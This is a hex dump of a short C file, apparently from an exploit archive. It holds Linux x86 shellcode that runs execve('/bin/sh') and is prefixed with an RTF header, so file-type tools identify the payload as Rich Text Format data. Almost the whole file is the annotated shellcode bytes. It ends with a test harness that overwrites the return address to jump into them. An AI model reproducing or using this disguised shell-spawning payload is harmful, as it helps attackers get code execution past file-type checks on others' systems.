00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 2d 20 65 78 65  63 76 65 28 22 2f 62 69  |6) - execve("/bi|
00000020  6e 2f 73 68 22 2c 20 5b  22 2f 62 69 6e 2f 73 68  |n/sh", ["/bin/sh|
00000030  22 2c 20 4e 55 4c 4c 5d  29 20 2b 20 52 54 46 20  |", NULL]) + RTF |
00000040  68 65 61 64 65 72 20 2d  20 33 30 20 62 79 74 65  |header - 30 byte|
00000050  73 0d 0a 20 2a 0d 0a 20  2a 20 72 6f 6f 74 40 6d  |s.. *.. * root@m|
00000060  61 67 69 63 62 6f 78 3a  7e 23 20 66 69 6c 65 20  |agicbox:~# file |
00000070  6c 69 6e 75 78 2d 73 68  2d 72 74 66 68 64 72 2e  |linux-sh-rtfhdr.|
00000080  62 69 6e 0d 0a 20 2a 20  6c 69 6e 75 78 2d 73 68  |bin.. * linux-sh|
00000090  2d 72 74 66 68 64 72 2e  62 69 6e 3a 20 52 69 63  |-rtfhdr.bin: Ric|
000000a0  68 20 54 65 78 74 20 46  6f 72 6d 61 74 20 64 61  |h Text Format da|
000000b0  74 61 2c 20 76 65 72 73  69 6f 6e 20 31 2c 0d 0a  |ta, version 1,..|
000000c0  20 2a 0d 0a 20 2a 20 2d  20 69 7a 69 6b 20 3c 69  | *.. * - izik <i|
000000d0  7a 69 6b 40 74 74 79 36  34 2e 6f 72 67 3e 0d 0a  |zik@tty64.org>..|
000000e0  20 2a 2f 0d 0a 0d 0a 63  68 61 72 20 73 68 65 6c  | */....char shel|
000000f0  6c 63 6f 64 65 5b 5d 20  3d 20 0d 0a 0d 0a 09 2f  |lcode[] = ...../|
00000100  2f 0d 0a 09 2f 2f 20 52  54 46 20 48 65 61 64 65  |/...// RTF Heade|
00000110  72 20 28 37 20 62 79 74  65 73 29 20 0d 0a 09 2f  |r (7 bytes) .../|
00000120  2f 20 2d 20 42 65 20 63  61 72 65 66 75 6c 20 6e  |/ - Be careful n|
00000130  6f 74 20 74 6f 20 74 72  69 67 67 65 72 20 61 6e  |ot to trigger an|
00000140  79 20 6f 66 20 74 68 6f  73 65 20 65 78 70 72 65  |y of those expre|
00000150  73 73 69 6f 6e 73 2e 0d  0a 09 2f 2f 0d 0a 0d 0a  |ssions....//....|
00000160  09 22 5c 78 37 62 5c 78  35 63 22 20 20 20 20 20  |."\x7b\x5c"     |
00000170  20 20 20 20 20 20 20 20  20 2f 2f 20 6a 6e 70 20  |         // jnp |
00000180  38 30 34 38 30 64 32 20  3c 5f 73 74 61 72 74 2b  |80480d2 <_start+|
00000190  30 78 35 65 3e 20 0d 0a  09 22 5c 78 37 32 5c 78  |0x5e> ..."\x72\x|
000001a0  37 34 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |74"             |
000001b0  20 2f 2f 20 6a 62 20 38  30 34 38 30 65 63 20 3c  | // jb 80480ec <|
000001c0  5f 73 74 61 72 74 2b 30  78 37 38 3e 20 0d 0a 09  |_start+0x78> ...|
000001d0  22 5c 78 36 36 5c 78 33  31 5c 78 63 30 22 20 20  |"\x66\x31\xc0"  |
000001e0  20 20 20 20 20 20 20 20  2f 2f 20 78 6f 72 20 25  |        // xor %|
000001f0  61 78 2c 25 61 78 20 0d  0a 0d 0a 09 2f 2f 0d 0a  |ax,%ax .....//..|
00000200  09 2f 2f 20 65 78 65 63  76 65 28 22 2f 62 69 6e  |.// execve("/bin|
00000210  2f 73 68 22 2c 20 5b 22  2f 62 69 6e 2f 73 68 22  |/sh", ["/bin/sh"|
00000220  2c 20 4e 55 4c 4c 5d 29  3b 0d 0a 09 2f 2f 0d 0a  |, NULL]);...//..|
00000230  0d 0a 09 22 5c 78 36 61  5c 78 30 62 22 20 20 20  |..."\x6a\x0b"   |
00000240  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
00000250  73 68 20 24 30 78 62 20  0d 0a 09 22 5c 78 35 38  |sh $0xb ..."\x58|
00000260  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000270  20 20 20 2f 2f 20 70 6f  70 20 25 65 61 78 20 0d  |   // pop %eax .|
00000280  0a 09 22 5c 78 39 39 22  20 20 20 20 20 20 20 20  |.."\x99"        |
00000290  20 20 20 20 20 20 20 20  20 20 2f 2f 20 63 6c 74  |          // clt|
000002a0  64 20 0d 0a 09 22 5c 78  35 32 22 20 20 20 20 20  |d ..."\x52"     |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000002c0  70 75 73 68 20 25 65 64  78 20 0d 0a 09 22 5c 78  |push %edx ..."\x|
000002d0  36 38 5c 78 32 66 5c 78  32 66 5c 78 37 33 5c 78  |68\x2f\x2f\x73\x|
000002e0  36 38 22 20 20 2f 2f 20  70 75 73 68 20 24 30 78  |68"  // push $0x|
000002f0  36 38 37 33 32 66 32 66  20 0d 0a 09 22 5c 78 36  |68732f2f ..."\x6|
00000300  38 5c 78 32 66 5c 78 36  32 5c 78 36 39 5c 78 36  |8\x2f\x62\x69\x6|
00000310  65 22 20 20 2f 2f 20 70  75 73 68 20 24 30 78 36  |e"  // push $0x6|
00000320  65 36 39 36 32 32 66 20  0d 0a 09 22 5c 78 38 39  |e69622f ..."\x89|
00000330  5c 78 65 33 22 20 20 20  20 20 20 20 20 20 20 20  |\xe3"           |
00000340  20 20 20 2f 2f 20 6d 6f  76 20 25 65 73 70 2c 25  |   // mov %esp,%|
00000350  65 62 78 20 0d 0a 09 22  5c 78 35 32 22 20 20 20  |ebx ..."\x52"   |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000370  2f 20 70 75 73 68 20 25  65 64 78 20 0d 0a 09 22  |/ push %edx ..."|
00000380  5c 78 35 33 22 20 20 20  20 20 20 20 20 20 20 20  |\x53"           |
00000390  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 25  |       // push %|
000003a0  65 62 78 20 0d 0a 09 22  5c 78 38 39 5c 78 65 31  |ebx ..."\x89\xe1|
000003b0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
000003c0  2f 20 6d 6f 76 20 25 65  73 70 2c 25 65 63 78 20  |/ mov %esp,%ecx |
000003d0  0d 0a 09 22 5c 78 63 64  5c 78 38 30 22 3b 20 20  |..."\xcd\x80";  |
000003e0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 69 6e  |           // in|
000003f0  74 20 24 30 78 38 30 20  0d 0a 0d 0a 69 6e 74 20  |t $0x80 ....int |
00000400  6d 61 69 6e 28 69 6e 74  20 61 72 67 63 2c 20 63  |main(int argc, c|
00000410  68 61 72 20 2a 2a 61 72  67 76 29 20 7b 0d 0a 09  |har **argv) {...|
00000420  69 6e 74 20 2a 72 65 74  3b 0d 0a 09 72 65 74 20  |int *ret;...ret |
00000430  3d 20 28 69 6e 74 20 2a  29 26 72 65 74 20 2b 20  |= (int *)&ret + |
00000440  32 3b 0d 0a 09 28 2a 72  65 74 29 20 3d 20 28 69  |2;...(*ret) = (i|
00000450  6e 74 29 20 73 68 65 6c  6c 63 6f 64 65 3b 0d 0a  |nt) shellcode;..|
00000460  7d                                                |}|
00000461
